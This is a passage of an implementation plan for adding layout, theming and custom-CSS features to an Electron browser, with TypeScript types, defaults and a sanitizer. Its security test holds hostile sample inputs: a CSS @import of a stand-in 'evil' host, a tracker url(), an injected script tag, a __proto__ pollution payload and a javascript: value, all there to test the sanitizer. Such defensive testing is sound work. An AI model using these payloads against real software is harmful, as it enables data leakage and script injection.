# Full Browser Customization & Live Design Studio Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Transform Nova Browser into a modular, fully customizable browser where users can reorder/hide/remove chrome controls, switch shell layouts (`classic-top`, `compact-single-row`, `vertical-left`, `vertical-right`), style 9 independent UI surface zones, customize New Tab widgets, write sanitized Custom CSS, share `.novatheme.json` packs, and edit everything live via Customize Mode.

**Architecture:** All customization state lives in a backward-compatible, versioned `BrowserDesignProfile` structure inside `UserSettings.designProfile` (plus optional per-workspace overrides in `UserSettings.workspaceDesigns`), keeping `defaultSettings` as the source of truth so E2EE LWW sync (`src/services/syncService.ts`) works without crypto changes. `useThemeLanguage.ts` resolves effective tokens (`resolveEffectiveDesign`), drives ~45 semantic CSS custom properties across 9 UI zones plus `#nova-custom-user-style`, while `App.tsx`, `TopBar.tsx`, `SidebarTabs.tsx`, and `NewTabPage.tsx` consume modular slot registries and layout flags under a live-draft `CustomizeContext`.

**Tech Stack:** React 18, TypeScript 5.6, Tailwind CSS v4, Framer Motion, Electron 43 (`BrowserWindow` vibrancy/backgroundMaterial IPC), Lucide Icons, `esbuild` + `node:assert/strict` test runner.

## Global Constraints

- **CSP & Custom CSS Security**: Production CSP enforces `script-src 'self' 'wasm-unsafe-eval'`; never inject unsanitized CSS into chrome `<style>` tags. Strip `@import`, `@charset`, `@namespace`, `expression()`, `javascript:`, `vbscript:`, `behavior:`, `-moz-binding`, markup close tags, and external `url(...)` protocols (`http:`, `https:`, `file:`, `data:`, `//`); cap Custom CSS at `32768` chars and apply only to host browser chrome (never inside `<webview>`).
- **Schema & Backup Security**: Validate `.novatheme.json` packs (`<= 131072` bytes), reject `__proto__`/`constructor`/`prototype` keys, validate color/gradient strings strictly, allowlist `ToolbarItemKind` values, and clamp numerical bounds (`opacity: 0.2..1`, `blur: 0..32`, `borderWidth: 0..2`, `radius: 0..24`, `sidebarWidth: 200..360`, `uiScale: 0.85..1.25`, `iconScale: 0.85..1.25`, `columns: 4..8`).
- **Backwards Compatibility**: Keep `settings.fontSize` controlling `BrowserView` page zoom (`setZoomFactor`). Preserve existing `theme`, `browserColor`, `accentColor`, `tabStyle`, `useVerticalTabs`, `showTasksWidget` behavior so `tests/english_settings_migration.test.ts` and `tests/sync_deletion_and_conflict.test.ts` keep passing unchanged.
- **Incognito Isolation**: `isIncognito` tabs retain a dark privacy-distinct chrome frame while inheriting structural layout and typography.
- **Shortcut Safety**: Avoid `Ctrl+Alt+<letter>` combos on Windows/Linux (`AltGr` conflict documented in `src/utils/keyboardShortcuts.ts`). Use `Shift+CmdOrCtrl+E` for Customize Mode and `Shift+CmdOrCtrl+0` (placed before `meta && key === '0'` zoom reset in `src/App.tsx`) plus Electron View Menu items for Emergency Safe Reset.
- **Webview Isolation During Edit**: When `isCustomizeMode` is true, mount a pointer/drag shield over `#browser-views-container` in `src/App.tsx` so `<webview>` never swallows drag-and-drop events.
- **Repository Hygiene**: Keep commits scoped cleanly per task; update Graphify with `graphify update .` once implementation completes.

---

### Task 1: Customization Types & Default Profile (`BrowserDesignProfile`)

**Files:**
- Create: `src/utils/designDefaults.ts`
- Modify: `src/types/browser.ts:107-208`
- Test: `tests/design_defaults.test.ts`

**Interfaces:**
- Consumes: `Tab`, `Workspace` from `src/types/browser.ts`
- Produces: `ChromeMode`, `TabBarPosition`, `ToolbarItemKind`, `ToolbarSlotItem`, `SurfaceZoneId`, `SurfaceZoneStyle`, `UiFontFamily`, `UiDensity`, `WindowMaterial`, `NewTabLayoutConfig`, `BrowserDesignProfile`, `PartialBrowserDesignProfile`, `ThemePackDocument` (`src/types/browser.ts`); `DEFAULT_DESIGN_PROFILE`, `TOOLBAR_ITEM_ORDER_DEFAULT`, `SURFACE_ZONE_IDS`, `createDefaultDesignProfile()` (`src/utils/designDefaults.ts`).

- [ ] **Step 1: Write failing test for default design profile structure and `defaultSettings` integration**

```ts
// tests/design_defaults.test.ts
import assert from 'node:assert/strict';
import { defaultSettings } from '../src/types/browser';
import {
  DEFAULT_DESIGN_PROFILE,
  SURFACE_ZONE_IDS,
  createDefaultDesignProfile,
} from '../src/utils/designDefaults';

assert.equal(DEFAULT_DESIGN_PROFILE.meta.version, 1);
assert.equal(SURFACE_ZONE_IDS.length, 9);
assert.equal(defaultSettings.designProfile?.layout.chromeMode, 'classic-top');
assert.ok(defaultSettings.designProfile?.layout.toolbarItems.some(i => i.kind === 'omnibox'));
assert.deepEqual(defaultSettings.workspaceDesigns, {});

const copyA = createDefaultDesignProfile();
const copyB = createDefaultDesignProfile();
copyA.layout.toolbarItems.pop();
assert.notEqual(copyA.layout.toolbarItems.length, copyB.layout.toolbarItems.length);
console.log('design_defaults.test.ts passed');
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx esbuild tests/design_defaults.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_defaults.cjs && node dist-test/design_defaults.cjs`  
Expected: FAIL (`Could not resolve "../src/utils/designDefaults"`).

- [ ] **Step 3: Add types to `src/types/browser.ts` and defaults in `src/utils/designDefaults.ts`**

Create `src/utils/designDefaults.ts`:
```ts
import type {
  BrowserDesignProfile,
  SurfaceZoneId,
  ToolbarItemKind,
  ToolbarSlotItem,
} from '../types/browser';

export const SURFACE_ZONE_IDS: readonly SurfaceZoneId[] = [
  'frame',
  'tabBar',
  'activeTab',
  'inactiveTab',
  'toolbar',
  'omnibox',
  'sidebar',
  'aiPanel',
  'popovers',
] as const;

export const ALLOWED_TOOLBAR_KINDS: readonly ToolbarItemKind[] = [
  'back',
  'forward',
  'reload',
  'home',
  'workspaces',
  'omnibox',
  'ai',
  'shield',
  'downloads',
  'extensions',
  'bookmarksToggle',
  'splitView',
  'pip',
  'screenshot',
  'account',
  'customize',
  'menu',
  'spacer',
  'divider',
] as const;

export const TOOLBAR_ITEM_ORDER_DEFAULT: ToolbarSlotItem[] = [
  { id: 'slot-back', kind: 'back', visible: true },
  { id: 'slot-forward', kind: 'forward', visible: true },
  { id: 'slot-reload', kind: 'reload', visible: true },
  { id: 'slot-home', kind: 'home', visible: true },
  { id: 'slot-omnibox', kind: 'omnibox', visible: true },
  { id: 'slot-ai', kind: 'ai', visible: true },
  { id: 'slot-divider-1', kind: 'divider', visible: true },
  { id: 'slot-shield', kind: 'shield', visible: true },
  { id: 'slot-downloads', kind: 'downloads', visible: true },
  { id: 'slot-extensions', kind: 'extensions', visible: true },
  { id: 'slot-account', kind: 'account', visible: true },
  { id: 'slot-customize', kind: 'customize', visible: true },
  { id: 'slot-menu', kind: 'menu', visible: true },
];

export const DEFAULT_DESIGN_PROFILE: BrowserDesignProfile = {
  meta: {
    version: 1,
    name: 'Nova Default',
    baseTemplateId: 'nova-default',
  },
  layout: {
    chromeMode: 'classic-top',
    tabBarPosition: 'above-toolbar',
    sidebarWidth: 250,
    sidebarCollapsedShowRail: false,
    sidebarSections: {
      favorites: true,
      pinned: true,
      folders: true,
      workspaces: true,
      dockFooter: true,
    },
    toolbarItems: TOOLBAR_ITEM_ORDER_DEFAULT,
    toolbarShowLabels: false,
    omniboxMaxWidth: 'balanced',
  },
  surfaces: {},
  typography: {
    fontFamily: 'system',
    uiScale: 1,
    iconScale: 1,
  },
  density: 'normal',
  effects: {
    windowMaterial: 'opaque',
    reduceChromeMotion: false,
  },
  newTabLayout: {
    clock: {
      visible: true,
      format: '24h',
      style: 'minimal',
      align: 'center',
    },
    greeting: {
      visible: true,
      customText: '',
    },
    searchBox: {
      visible: true,
      style: 'glass',
      width: 'medium',
    },
    shortcuts: {
      visible: true,
      columns: 4,
      cardStyle: 'tile',
    },
    tasksWidget: {
      visible: false,
      placement: 'bottom',
    },
  },
  customCss: {
    enabled: false,
    css: '',
  },
};

export function createDefaultDesignProfile(): BrowserDesignProfile {
  return JSON.parse(JSON.stringify(DEFAULT_DESIGN_PROFILE)) as BrowserDesignProfile;
}
```

Update `src/types/browser.ts` before `UserSettings` (and add `designProfile?: BrowserDesignProfile; workspaceDesigns?: Record<string, Partial<BrowserDesignProfile>>;` to `UserSettings` and `defaultSettings`):
```ts
export type ChromeMode = 'classic-top' | 'compact-single-row' | 'vertical-left' | 'vertical-right';
export type TabBarPosition = 'above-toolbar' | 'below-toolbar';

export type ToolbarItemKind =
  | 'back'
  | 'forward'
  | 'reload'
  | 'home'
  | 'workspaces'
  | 'omnibox'
  | 'ai'
  | 'shield'
  | 'downloads'
  | 'extensions'
  | 'bookmarksToggle'
  | 'splitView'
  | 'pip'
  | 'screenshot'
  | 'account'
  | 'customize'
  | 'menu'
  | 'spacer'
  | 'divider';

export interface ToolbarSlotItem {
  id: string;
  kind: ToolbarItemKind;
  visible: boolean;
}

export type SurfaceZoneId =
  | 'frame'
  | 'tabBar'
  | 'activeTab'
  | 'inactiveTab'
  | 'toolbar'
  | 'omnibox'
  | 'sidebar'
  | 'aiPanel'
  | 'popovers';

export interface SurfaceZoneStyle {
  bg?: string;
  textColor?: string;
  mutedColor?: string;
  opacity?: number;
  blur?: number;
  borderColor?: string;
  borderWidth?: number;
  radius?: number;
  shadow?: 'none' | 'soft' | 'elevated' | 'glow';
}

export type UiFontFamily = 'system' | 'inter' | 'geist' | 'mono' | 'serif' | 'rounded';
export type UiDensity = 'compact' | 'normal' | 'comfortable';
export type WindowMaterial = 'opaque' | 'glass-vibrancy';

export interface NewTabLayoutConfig {
  clock: {
    visible: boolean;
    format: '24h' | '12h';
    style: 'minimal' | 'editorial' | 'mono' | 'pill';
    align: 'center' | 'left';
  };
  greeting: {
    visible: boolean;
    customText?: string;
  };
  searchBox: {
    visible: boolean;
    style: 'glass' | 'solid' | 'minimal' | 'pill';
    width: 'narrow' | 'medium' | 'wide';
  };
  shortcuts: {
    visible: boolean;
    columns: 4 | 5 | 6 | 7 | 8;
    cardStyle: 'tile' | 'pill' | 'icon-only' | 'compact';
  };
  tasksWidget: {
    visible: boolean;
    placement: 'bottom' | 'left' | 'right' | 'floating';
  };
}

export interface BrowserDesignProfile {
  meta: {
    version: 1;
    name: string;
    author?: string;
    baseTemplateId?: string;
  };
  layout: {
    chromeMode: ChromeMode;
    tabBarPosition: TabBarPosition;
    sidebarWidth: number;
    sidebarCollapsedShowRail: boolean;
    sidebarSections: {
      favorites: boolean;
      pinned: boolean;
      folders: boolean;
      workspaces: boolean;
      dockFooter: boolean;
    };
    toolbarItems: ToolbarSlotItem[];
    toolbarShowLabels: boolean;
    omniboxMaxWidth: 'compact' | 'balanced' | 'full';
  };
  surfaces: Partial<Record<SurfaceZoneId, SurfaceZoneStyle>>;
  typography: {
    fontFamily: UiFontFamily;
    uiScale: number;
    iconScale: number;
  };
  density: UiDensity;
  effects: {
    windowMaterial: WindowMaterial;
    reduceChromeMotion: boolean;
  };
  newTabLayout: NewTabLayoutConfig;
  customCss: {
    enabled: boolean;
    css: string;
  };
}

export interface PartialBrowserDesignProfile {
  meta?: Partial<BrowserDesignProfile['meta']>;
  layout?: Partial<Omit<BrowserDesignProfile['layout'], 'sidebarSections'>> & {
    sidebarSections?: Partial<BrowserDesignProfile['layout']['sidebarSections']>;
  };
  surfaces?: BrowserDesignProfile['surfaces'];
  typography?: Partial<BrowserDesignProfile['typography']>;
  density?: UiDensity;
  effects?: Partial<BrowserDesignProfile['effects']>;
  newTabLayout?: {
    clock?: Partial<NewTabLayoutConfig['clock']>;
    greeting?: Partial<NewTabLayoutConfig['greeting']>;
    searchBox?: Partial<NewTabLayoutConfig['searchBox']>;
    shortcuts?: Partial<NewTabLayoutConfig['shortcuts']>;
    tasksWidget?: Partial<NewTabLayoutConfig['tasksWidget']>;
  };
  customCss?: Partial<BrowserDesignProfile['customCss']>;
}

export interface ThemePackDocument {
  format: 'nova-theme-pack';
  schemaVersion: 1;
  exportedAt: number;
  profile: BrowserDesignProfile;
}
```
Import `createDefaultDesignProfile` from `'../utils/designDefaults'` in `src/types/browser.ts` and add:
- On `UserSettings`: `designProfile?: BrowserDesignProfile; workspaceDesigns?: Record<string, PartialBrowserDesignProfile>;`
- On `defaultSettings`: `designProfile: createDefaultDesignProfile(), workspaceDesigns: {},`
Note: types-only import of `BrowserDesignProfile` inside `src/utils/designDefaults.ts` prevents runtime circular dependencies in `esbuild` and TypeScript.

- [ ] **Step 4: Run test to verify it passes**

Run: `npx esbuild tests/design_defaults.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_defaults.cjs && node dist-test/design_defaults.cjs && npx tsc --noEmit`  
Expected: PASS and 0 TS errors.

- [ ] **Step 5: Commit**

```bash
git add src/types/browser.ts src/utils/designDefaults.ts tests/design_defaults.test.ts
git commit -m "feat(customization): add BrowserDesignProfile schema and defaults"
```

---

### Task 2: `.novatheme.json` & Custom CSS Security Sanitizer

**Files:**
- Create: `src/utils/designSecurity.ts`
- Test: `tests/design_customization_security.test.ts`

**Interfaces:**
- Consumes: `BrowserDesignProfile`, `PartialBrowserDesignProfile`, `SurfaceZoneStyle`, `ToolbarSlotItem`, `ThemePackDocument` (`src/types/browser.ts`), `ALLOWED_TOOLBAR_KINDS`, `SURFACE_ZONE_IDS`, `createDefaultDesignProfile` (`src/utils/designDefaults.ts`)
- Produces: `sanitizeCustomCss(rawCss: string): { css: string; warnings: string[] }`, `isSafeSurfaceColor(val: unknown): val is string`, `sanitizeDesignProfile(input: unknown): BrowserDesignProfile`, `sanitizePartialDesignProfile(input: unknown): PartialBrowserDesignProfile`, `exportThemePack(profile: BrowserDesignProfile): string`, `importThemePack(rawJson: string): { ok: true; profile: BrowserDesignProfile } | { ok: false; error: string }`.

- [ ] **Step 1: Write failing security tests**

```ts
// tests/design_customization_security.test.ts
import assert from 'node:assert/strict';
import {
  sanitizeCustomCss,
  sanitizeDesignProfile,
  importThemePack,
  exportThemePack,
} from '../src/utils/designSecurity';
import { createDefaultDesignProfile } from '../src/utils/designDefaults';

// 1. Custom CSS sanitization strips exfiltration and active directives
const evilCss = `
  @import url("https://evil.example/leak.css");
  .nova-toolbar {
    background: url("https://tracker.example/pixel?c=1");
    color: #ff00aa;
    behavior: url(xss.htc);
  }
  </style><script>alert(1)</script>
`;
const cleaned = sanitizeCustomCss(evilCss);
assert.ok(!cleaned.css.includes('@import'), 'Must strip @import');
assert.ok(!cleaned.css.includes('https://'), 'Must strip external URLs');
assert.ok(!cleaned.css.includes('behavior:'), 'Must strip legacy behavior');
assert.ok(!cleaned.css.includes('</style'), 'Must strip closing style tag');
assert.ok(cleaned.css.includes('#ff00aa'), 'Must keep benign declarations');
assert.ok(cleaned.warnings.length >= 3, 'Must report stripped rules');

// 2. Clamping and prototype pollution rejection
const dirtyPayload = JSON.parse(
  '{"__proto__":{"polluted":true},"layout":{"sidebarWidth":9999,"chromeMode":"evil"},"surfaces":{"toolbar":{"opacity":0.01,"blur":900,"bg":"javascript:alert(1)"}},"typography":{"uiScale":5}}'
);
const sanitized = sanitizeDesignProfile(dirtyPayload);
assert.equal((Object.prototype as any).polluted, undefined);
assert.equal(sanitized.layout.sidebarWidth, 360);
assert.equal(sanitized.layout.chromeMode, 'classic-top');
assert.equal(sanitized.surfaces.toolbar?.opacity, 0.2);
assert.equal(sanitized.surfaces.toolbar?.blur, 32);
assert.equal(sanitized.surfaces.toolbar?.bg, undefined);
assert.equal(sanitized.typography.uiScale, 1.25);

// 3. Export / import roundtrip and invalid pack rejection
const exported = exportThemePack(createDefaultDesignProfile());
const imported = importThemePack(exported);
assert.equal(imported.ok, true);
assert.equal(importThemePack('{"format":"other"}').ok, false);
console.log('design_customization_security.test.ts passed');
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx esbuild tests/design_customization_security.test.ts --bundle --platform=node --external:electron --define:import.meta.env="{}" --outfile=dist-test/design_sec.cjs && node dist-test/design_sec.cjs`  
Expected: FAIL (`Could not resolve "../src/utils/designSecurity"`).

- [ ] **Step 3: Implement `src/utils/designSecurity.ts`**

```ts
import type {
  BrowserDesignProfile,
  ChromeMode,
  NewTabLayoutConfig,
  PartialBrowserDesignProfile,
  SurfaceZoneId,
  SurfaceZoneStyle,
  TabBarPosition,
  ThemePackDocument,
  ToolbarItemKind,
  ToolbarSlotItem,
  UiDensity,
  UiFontFamily,
  WindowMaterial,
} from '../types/browser';
import {
  ALLOWED_TOOLBAR_KINDS,
  SURFACE_ZONE_IDS,
  createDefaultDesignProfile,
} from './designDefaults';

const MAX_THEME_PACK_BYTES = 131_072;
const MAX_CUSTOM_CSS_CHARS = 32_768;

const HEX_COLOR_RE = /^#(?:[0-9a-fA-F]{3,4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;
const RGB_FUNC_RE = /^rgba?\(\s*\d{1,3}\s*,\s*\d{1,3}\s*,\s*\d{1,3}(?:\s*[,/]\s*(?:0|1|0?\.\d+|\d{1,3}%))?\s*\)$/;
const GRADIENT_RE = /^(?:linear|radial|conic)-gradient\([^{};<>]+?\)$/i;
const SAFE_SLOT_ID_RE = /^[a-zA-Z0-9_-]{1,48}$/;

export function clampNumber(value: unknown, min: number, max: number, fallback: number): number {
  if (typeof value !== 'number' || !Number.isFinite(value)) return fallback;
  return Math.min(max, Math.max(min, value));
}

export function isSafeSurfaceColor(val: unknown): val is string {
  if (typeof val !== 'string') return false;
  const trimmed = val.trim();
  if (!trimmed || trimmed.length > 240) return false;
  if (/url\s*\(/i.test(trimmed) || /expression\s*\(/i.test(trimmed) || /javascript:/i.test(trimmed)) {
    return false;
  }
  if (trimmed === 'inherit' || trimmed === 'transparent') return true;
  return HEX_COLOR_RE.test(trimmed) || RGB_FUNC_RE.test(trimmed) || GRADIENT_RE.test(trimmed);
}

export function sanitizeCustomCss(rawCss: string): { css: string; warnings: string[] } {
  const warnings: string[] = [];
  if (typeof rawCss !== 'string' || !rawCss.trim()) {
    return { css: '', warnings };
  }

  let css = rawCss;
  if (css.length > MAX_CUSTOM_CSS_CHARS) {
    css = css.slice(0, MAX_CUSTOM_CSS_CHARS);
    warnings.push(`Custom CSS truncated to ${MAX_CUSTOM_CSS_CHARS} characters.`);
  }

  const rules: Array<{ pattern: RegExp; replacement: string; message: string }> = [
    { pattern: /<\/?\s*(?:style|script)[^>]*>/gi, replacement: '', message: 'Stripped HTML style/script tag markup.' },
    { pattern: /@(?:import|charset|namespace)\b[^;]*(?:;|$)/gi, replacement: '', message: 'Stripped @import/@charset/@namespace directive.' },
    { pattern: /expression\s*\([^)]*\)/gi, replacement: 'none', message: 'Stripped CSS expression() call.' },
    { pattern: /url\s*\(\s*(['"]?)\s*(?:https?:|file:|data:|\/\/|javascript:|vbscript:)[^)]*\1\s*\)/gi, replacement: 'none', message: 'Stripped external or protocol url() reference.' },
    { pattern: /(?:^|[;\s{])(?:behavior|-moz-binding)\s*:[^;]*(?:;|$)/gi, replacement: '', message: 'Stripped unsafe behavior/-moz-binding property.' },
    { pattern: /(?:javascript|vbscript)\s*:/gi, replacement: '', message: 'Stripped script protocol string.' },
  ];

  for (const rule of rules) {
    if (rule.pattern.test(css)) {
      css = css.replace(rule.pattern, rule.replacement);
      warnings.push(rule.message);
    }
  }

  return { css: css.trim(), warnings };
}

function isPlainRecord(val: unknown): val is Record<string, unknown> {
  return Boolean(val) && typeof val === 'object' && !Array.isArray(val);
}

function sanitizeToolbarItems(raw: unknown, fallback: ToolbarSlotItem[]): ToolbarSlotItem[] {
  if (!Array.isArray(raw)) return fallback;
  const seenIds = new Set<string>();
  const result: ToolbarSlotItem[] = [];
  for (let i = 0; i < raw.length && result.length < 40; i++) {
    const entry = raw[i];
    if (!isPlainRecord(entry)) continue;
    const kind = entry.kind as ToolbarItemKind;
    if (!ALLOWED_TOOLBAR_KINDS.includes(kind)) continue;
    const rawId = typeof entry.id === 'string' && SAFE_SLOT_ID_RE.test(entry.id)
      ? entry.id
      : `slot-${kind}-${i}`;
    if (seenIds.has(rawId)) continue;
    seenIds.add(rawId);
    result.push({
      id: rawId,
      kind,
      visible: typeof entry.visible === 'boolean' ? entry.visible : true,
    });
  }
  return result.length > 0 ? result : fallback;
}

function sanitizeSurfaceZone(raw: unknown): SurfaceZoneStyle | undefined {
  if (!isPlainRecord(raw)) return undefined;
  const zone: SurfaceZoneStyle = {};
  if (isSafeSurfaceColor(raw.bg)) zone.bg = raw.bg.trim();
  if (isSafeSurfaceColor(raw.textColor)) zone.textColor = raw.textColor.trim();
  if (isSafeSurfaceColor(raw.mutedColor)) zone.mutedColor = raw.mutedColor.trim();
  if (isSafeSurfaceColor(raw.borderColor)) zone.borderColor = raw.borderColor.trim();
  if (typeof raw.opacity === 'number') zone.opacity = clampNumber(raw.opacity, 0.2, 1, 1);
  if (typeof raw.blur === 'number') zone.blur = Math.round(clampNumber(raw.blur, 0, 32, 0));
  if (typeof raw.borderWidth === 'number') zone.borderWidth = Math.round(clampNumber(raw.borderWidth, 0, 2, 1));
  if (typeof raw.radius === 'number') zone.radius = Math.round(clampNumber(raw.radius, 0, 24, 10));
  if (typeof raw.shadow === 'string' && ['none', 'soft', 'elevated', 'glow'].includes(raw.shadow)) {
    zone.shadow = raw.shadow as SurfaceZoneStyle['shadow'];
  }
  return Object.keys(zone).length > 0 ? zone : undefined;
}

function sanitizeNewTabLayout(raw: unknown, fallback: NewTabLayoutConfig): NewTabLayoutConfig {
  if (!isPlainRecord(raw)) return fallback;
  const clockRaw = isPlainRecord(raw.clock) ? raw.clock : {};
  const greetingRaw = isPlainRecord(raw.greeting) ? raw.greeting : {};
  const searchRaw = isPlainRecord(raw.searchBox) ? raw.searchBox : {};
  const shortcutsRaw = isPlainRecord(raw.shortcuts) ? raw.shortcuts : {};
  const tasksRaw = isPlainRecord(raw.tasksWidget) ? raw.tasksWidget : {};

  return {
    clock: {
      visible: typeof clockRaw.visible === 'boolean' ? clockRaw.visible : fallback.clock.visible,
      format: clockRaw.format === '12h' || clockRaw.format === '24h' ? clockRaw.format : fallback.clock.format,
      style: typeof clockRaw.style === 'string' && ['minimal', 'editorial', 'mono', 'pill'].includes(clockRaw.style)
        ? (clockRaw.style as NewTabLayoutConfig['clock']['style'])
        : fallback.clock.style,
      align: clockRaw.align === 'left' || clockRaw.align === 'center' ? clockRaw.align : fallback.clock.align,
    },
    greeting: {
      visible: typeof greetingRaw.visible === 'boolean' ? greetingRaw.visible : fallback.greeting.visible,
      customText: typeof greetingRaw.customText === 'string' ? greetingRaw.customText.slice(0, 80) : fallback.greeting.customText,
    },
    searchBox: {
      visible: typeof searchRaw.visible === 'boolean' ? searchRaw.visible : fallback.searchBox.visible,
      style: typeof searchRaw.style === 'string' && ['glass', 'solid', 'minimal', 'pill'].includes(searchRaw.style)
        ? (searchRaw.style as NewTabLayoutConfig['searchBox']['style'])
        : fallback.searchBox.style,
      width: typeof searchRaw.width === 'string' && ['narrow', 'medium', 'wide'].includes(searchRaw.width)
        ? (searchRaw.width as NewTabLayoutConfig['searchBox']['width'])
        : fallback.searchBox.width,
    },
    shortcuts: {
      visible: typeof shortcutsRaw.visible === 'boolean' ? shortcutsRaw.visible : fallback.shortcuts.visible,
      columns: (Math.round(clampNumber(shortcutsRaw.columns, 4, 8, fallback.shortcuts.columns)) as 4 | 5 | 6 | 7 | 8),
      cardStyle: typeof shortcutsRaw.cardStyle === 'string' && ['tile', 'pill', 'icon-only', 'compact'].includes(shortcutsRaw.cardStyle)
        ? (shortcutsRaw.cardStyle as NewTabLayoutConfig['shortcuts']['cardStyle'])
        : fallback.shortcuts.cardStyle,
    },
    tasksWidget: {
      visible: typeof tasksRaw.visible === 'boolean' ? tasksRaw.visible : fallback.tasksWidget.visible,
      placement: typeof tasksRaw.placement === 'string' && ['bottom', 'left', 'right', 'floating'].includes(tasksRaw.placement)
        ? (tasksRaw.placement as NewTabLayoutConfig['tasksWidget']['placement'])
        : fallback.tasksWidget.placement,
    },
  };
}

export function sanitizeDesignProfile(input: unknown, baseProfile?: BrowserDesignProfile): BrowserDesignProfile {
  const base = baseProfile ? JSON.parse(JSON.stringify(baseProfile)) as BrowserDesignProfile : createDefaultDesignProfile();
  if (!isPlainRecord(input)) return base;

  const metaRaw = isPlainRecord(input.meta) ? input.meta : {};
  const layoutRaw = isPlainRecord(input.layout) ? input.layout : {};
  const secRaw = isPlainRecord(layoutRaw.sidebarSections) ? layoutRaw.sidebarSections : {};
  const surfacesRaw = isPlainRecord(input.surfaces) ? input.surfaces : {};
  const typoRaw = isPlainRecord(input.typography) ? input.typography : {};
  const effectsRaw = isPlainRecord(input.effects) ? input.effects : {};
  const cssRaw = isPlainRecord(input.customCss) ? input.customCss : {};

  const surfaces: Partial<Record<SurfaceZoneId, SurfaceZoneStyle>> = {};
  for (const zoneId of SURFACE_ZONE_IDS) {
    const sanitizedZone = sanitizeSurfaceZone(surfacesRaw[zoneId]);
    if (sanitizedZone) surfaces[zoneId] = sanitizedZone;
  }

  const sanitizedCss = sanitizeCustomCss(typeof cssRaw.css === 'string' ? cssRaw.css : base.customCss.css);

  return {
    meta: {
      version: 1,
      name: typeof metaRaw.name === 'string' && metaRaw.name.trim() ? metaRaw.name.trim().slice(0, 64) : base.meta.name,
      author: typeof metaRaw.author === 'string' ? metaRaw.author.trim().slice(0, 64) : base.meta.author,
      baseTemplateId: typeof metaRaw.baseTemplateId === 'string' ? metaRaw.baseTemplateId.slice(0, 48) : base.meta.baseTemplateId,
    },
    layout: {
      chromeMode: typeof layoutRaw.chromeMode === 'string' && ['classic-top', 'compact-single-row', 'vertical-left', 'vertical-right'].includes(layoutRaw.chromeMode)
        ? (layoutRaw.chromeMode as ChromeMode)
        : base.layout.chromeMode,
      tabBarPosition: layoutRaw.tabBarPosition === 'above-toolbar' || layoutRaw.tabBarPosition === 'below-toolbar'
        ? (layoutRaw.tabBarPosition as TabBarPosition)
        : base.layout.tabBarPosition,
      sidebarWidth: Math.round(clampNumber(layoutRaw.sidebarWidth, 200, 360, base.layout.sidebarWidth)),
      sidebarCollapsedShowRail: typeof layoutRaw.sidebarCollapsedShowRail === 'boolean' ? layoutRaw.sidebarCollapsedShowRail : base.layout.sidebarCollapsedShowRail,
      sidebarSections: {
        favorites: typeof secRaw.favorites === 'boolean' ? secRaw.favorites : base.layout.sidebarSections.favorites,
        pinned: typeof secRaw.pinned === 'boolean' ? secRaw.pinned : base.layout.sidebarSections.pinned,
        folders: typeof secRaw.folders === 'boolean' ? secRaw.folders : base.layout.sidebarSections.folders,
        workspaces: typeof secRaw.workspaces === 'boolean' ? secRaw.workspaces : base.layout.sidebarSections.workspaces,
        dockFooter: typeof secRaw.dockFooter === 'boolean' ? secRaw.dockFooter : base.layout.sidebarSections.dockFooter,
      },
      toolbarItems: sanitizeToolbarItems(layoutRaw.toolbarItems, base.layout.toolbarItems),
      toolbarShowLabels: typeof layoutRaw.toolbarShowLabels === 'boolean' ? layoutRaw.toolbarShowLabels : base.layout.toolbarShowLabels,
      omniboxMaxWidth: typeof layoutRaw.omniboxMaxWidth === 'string' && ['compact', 'balanced', 'full'].includes(layoutRaw.omniboxMaxWidth)
        ? (layoutRaw.omniboxMaxWidth as BrowserDesignProfile['layout']['omniboxMaxWidth'])
        : base.layout.omniboxMaxWidth,
    },
    surfaces,
    typography: {
      fontFamily: typeof typoRaw.fontFamily === 'string' && ['system', 'inter', 'geist', 'mono', 'serif', 'rounded'].includes(typoRaw.fontFamily)
        ? (typoRaw.fontFamily as UiFontFamily)
        : base.typography.fontFamily,
      uiScale: Number(clampNumber(typoRaw.uiScale, 0.85, 1.25, base.typography.uiScale).toFixed(2)),
      iconScale: Number(clampNumber(typoRaw.iconScale, 0.85, 1.25, base.typography.iconScale).toFixed(2)),
    },
    density: typeof input.density === 'string' && ['compact', 'normal', 'comfortable'].includes(input.density)
      ? (input.density as UiDensity)
      : base.density,
    effects: {
      windowMaterial: effectsRaw.windowMaterial === 'glass-vibrancy' || effectsRaw.windowMaterial === 'opaque'
        ? (effectsRaw.windowMaterial as WindowMaterial)
        : base.effects.windowMaterial,
      reduceChromeMotion: typeof effectsRaw.reduceChromeMotion === 'boolean' ? effectsRaw.reduceChromeMotion : base.effects.reduceChromeMotion,
    },
    newTabLayout: sanitizeNewTabLayout(input.newTabLayout, base.newTabLayout),
    customCss: {
      enabled: typeof cssRaw.enabled === 'boolean' ? cssRaw.enabled : base.customCss.enabled,
      css: sanitizedCss.css,
    },
  };
}

export function sanitizePartialDesignProfile(input: unknown): PartialBrowserDesignProfile {
  if (!isPlainRecord(input)) return {};
  const out: PartialBrowserDesignProfile = {};

  if (isPlainRecord(input.meta)) {
    out.meta = {};
    if (typeof input.meta.name === 'string' && input.meta.name.trim()) out.meta.name = input.meta.name.trim().slice(0, 64);
    if (typeof input.meta.author === 'string') out.meta.author = input.meta.author.trim().slice(0, 64);
    if (typeof input.meta.baseTemplateId === 'string') out.meta.baseTemplateId = input.meta.baseTemplateId.slice(0, 48);
  }

  if (isPlainRecord(input.layout)) {
    const l = input.layout;
    out.layout = {};
    if (typeof l.chromeMode === 'string' && ['classic-top', 'compact-single-row', 'vertical-left', 'vertical-right'].includes(l.chromeMode)) {
      out.layout.chromeMode = l.chromeMode as ChromeMode;
    }
    if (l.tabBarPosition === 'above-toolbar' || l.tabBarPosition === 'below-toolbar') {
      out.layout.tabBarPosition = l.tabBarPosition as TabBarPosition;
    }
    if (typeof l.sidebarWidth === 'number') {
      out.layout.sidebarWidth = Math.round(clampNumber(l.sidebarWidth, 200, 360, 250));
    }
    if (typeof l.sidebarCollapsedShowRail === 'boolean') out.layout.sidebarCollapsedShowRail = l.sidebarCollapsedShowRail;
    if (isPlainRecord(l.sidebarSections)) {
      const s = l.sidebarSections;
      out.layout.sidebarSections = {};
